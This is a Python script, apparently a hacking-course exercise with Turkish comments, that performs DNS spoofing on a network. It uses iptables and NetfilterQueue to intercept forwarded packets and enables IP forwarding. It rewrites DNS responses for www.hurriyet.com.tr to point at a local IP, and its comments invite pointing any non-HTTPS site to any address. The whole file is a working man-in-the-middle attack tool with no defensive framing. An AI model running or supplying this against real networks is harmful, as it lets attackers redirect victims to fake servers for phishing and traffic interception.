import netfilterqueue
import subprocess
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # https olmayan herhangi bir siteyi asagidaki if dongusune atayin
        if "www.hurriyet.com.tr" in qname:
            print("[+] Spoofing Target")
            # hedefi yonlendirmek istegidiniz ip yi rdata ya girin
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.102")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


try:
    print("[-] tryin setting iptables")
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] queue created")
    print("[-] tryin setting ip_forward")
    subprocess.call(["echo 1 >/proc/sys/net/ipv4/ip_forward"], shell=True)
    print("[+] ip_forward completed")

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] tryin iptables clear")
    subprocess.call(["iptables", "--flush"])
    print("[+] completed")
    print("[-] tryin clear ip_forward")
    subprocess.call(["echo 0 >/proc/sys/net/ipv4/ip_forward"], shell=True)
    print("[+] ip_forward clear")
    print("[-] Quitting Now...Good Bye \n")

